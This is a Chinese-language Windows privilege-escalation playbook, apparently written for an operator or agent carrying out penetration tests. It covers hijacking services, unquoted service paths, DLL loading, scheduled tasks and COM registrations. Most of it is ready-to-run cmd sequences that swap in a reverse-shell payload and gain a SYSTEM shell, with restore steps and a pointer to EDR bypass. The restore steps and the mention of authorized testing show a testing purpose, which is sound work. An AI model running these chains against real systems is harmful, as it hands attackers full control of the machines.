# 服务 / DLL / 计划任务 / COM 劫持

> **TECH：** 让已有 SYSTEM/管理员上下文加载攻击者控制的文件  
> **IMPACT：** SYSTEM shell  
> **成功：** 服务/任务/COM 触发后 `whoami` = SYSTEM，不是“ACL 显示 (F)”

---

## 1. 可写服务二进制

```cmd
sc qc <svc>
icacls "C:\Program Files\App\service.exe"
```

`BUILTIN\Users:(M)` / `(F)` 或当前用户有写 → 可换。

```cmd
copy /y service.exe service.exe.bak
copy /y C:\Users\Public\payload.exe service.exe
net stop <svc>
net start <svc>
```

没有停服务权限时：有 `SeShutdownPrivilege` 才考虑 `shutdown /r /t 0`（破坏性强，先问操作者）。否则等服务自己重启。

PowerUp/PrivescCheck：`Get-ModifiableServiceFile`。不要只跑检查。

payload 直接回连 SYSTEM：

```cmd
# payload.exe 用 msfvenom/cs/sliver 生成的 exec 或 reverse shell
```

RESTORE：`copy /y service.exe.bak service.exe` + 启动。

---

## 2. 服务 DACL（文件本身不可写，服务对象可写）

```cmd
sc sdshow <svc>
accesschk.exe -uwcqv %USERNAME% *
accesschk.exe -uwcqv "Authenticated Users" *
```

可改配置：

```cmd
sc config <svc> binpath= "C:\Users\Public\payload.exe"
sc config <svc> obj= ".\LocalSystem" password= ""
net stop <svc> & net start <svc>
```

RESTORE：记下原 `binpath` / `obj`，打完写回。

```cmd
sc qc <svc>
sc config <svc> binpath= "原路径"
```

---

## 3. 注册表 ImagePath

```cmd
accesschk.exe -uvwqk HKLM\System\CurrentControlSet\Services
reg query HKLM\System\CurrentControlSet\Services\<svc> /v ImagePath
reg add HKLM\System\CurrentControlSet\Services\<svc> /v ImagePath /d "C:\Users\Public\payload.exe" /f
net stop <svc> & net start <svc>
```

RESTORE：`reg add ... /d "原ImagePath" /f`

---

## 4. 无引号服务路径

```cmd
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v "\""
```

路径 `C:\Program Files\My App\service.exe` 无引号时，Windows 依次试：

```text
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My App\service.exe
```

```cmd
icacls "C:\"
icacls "C:\Program Files"
copy payload.exe "C:\Program.exe"
net start <svc>
```

现代系统 `C:\` 对 Users 不可写。必须确认 **实际可写的那一截**。SeManageVolume 刚改过 `C:\` ACL 时这条突然可用。

RESTORE：删投放的 `Program.exe` / `My.exe`。

---

## 5. DLL 劫持

SYSTEM 服务或自动启动的管理员进程从可写目录加载缺失 DLL。

```text
Procmon: 目标进程 + Result = NAME NOT FOUND + Path 在可写目录
或 PrivescCheck / SharpUp 的 DLL hijack 结果
```

```cmd
icacls "C:\App"
echo test > "C:\App\test.txt"
```

把 payload DLL 放到缺失名（如 `TextShaping.dll`）。编译入口 `DllMain` / `DLL_PROCESS_ATTACH` 里回连。

权限 = **加载该 DLL 的进程权限**。用户启动的程序 ≠ 提权。

RESTORE：删 DLL、删 test.txt。

---

## 6. 计划任务

```cmd
schtasks /query /fo LIST /v
```

关注 `Run As User` = `SYSTEM` / `Administrator`，以及 `Task To Run` 路径、Working Directory。

```cmd
icacls "C:\path\to\task.exe"
icacls "C:\path\to\workingdir"
```

可写 exe → 替换。可写工作目录且任务用相对路径 → 放同名假二进制。

XML 可写时：

```cmd
schtasks /query /tn "<name>" /xml > C:\Users\Public\t.xml
:: 改 Actions 后
schtasks /delete /tn "<name>" /f
schtasks /create /xml C:\Users\Public\t.xml /tn "<name>"
```

没有改任务权限就不要删。等 Next Run Time。

RESTORE：原 exe / 原 XML。

---

## 7. COM 劫持

高权限进程按 CLSID 加载 `InprocServer32`。当前用户 `HKCU\Software\Classes\CLSID\{...}\InprocServer32` 可劫持 **以该用户身份** 启动的 COM；要 SYSTEM 必须劫持 SYSTEM 上下文查找的键（少见，通常要已能写 HKLM）。

```cmd
reg query HKLM\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32
icacls 对应 DLL 路径
```

缺失 DLL + 目录可写 → 同 DLL 劫持。  
能写 HKLM CLSID → 指向 payload DLL，等 SYSTEM 服务 CoCreate。

不要用 HKCU fodhelper 当 SYSTEM 手段，那是 UAC，见 `installer-uac.md`。

RESTORE：删 HKCU 键或恢复 HKLM `InprocServer32`。

---

## GATES

```text
触发上下文必须是 SYSTEM/管理员
当前用户对文件或服务对象有写
能重启服务 / 等计划任务 / 等 COM 被加载
WDAC/AppLocker 不拦 payload 路径；拦住走 /edr-bypass
```

## IMPACT

替换 SYSTEM 服务二进制会使该服务不可用直到还原。授权测试先备份。
